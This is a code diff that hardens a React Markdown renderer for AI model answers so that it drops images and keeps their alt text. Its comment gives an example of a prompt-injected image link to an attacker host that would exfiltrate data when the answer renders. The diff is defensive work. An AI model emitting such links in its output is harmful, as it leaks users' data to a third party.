@@ -1,10 +1,15 @@
 import ReactMarkdown from "react-markdown";
 
-/** Renders model answers and quoted sources. Raw HTML in the text is not rendered. */
+/**
+ * Renders model answers and quoted sources. Raw HTML is not rendered, and images are dropped
+ * (their alt text is kept): a prompt-injected `![](https://attacker/?data)` would otherwise be
+ * fetched by the browser as soon as the answer renders.
+ */
 export function Markdown({ children }: { children: string }) {
   return (
     <ReactMarkdown
       components={{
+        img: ({ alt }) => <span>{alt}</span>,
         p: ({ children }) => <p dir="auto" className="leading-7 [&:not(:first-child)]:mt-3">{children}</p>,
         ul: ({ children }) => <ul className="mt-2 list-disc ps-6">{children}</ul>,
         ol: ({ children }) => <ol className="mt-2 list-decimal ps-6">{children}</ol>,
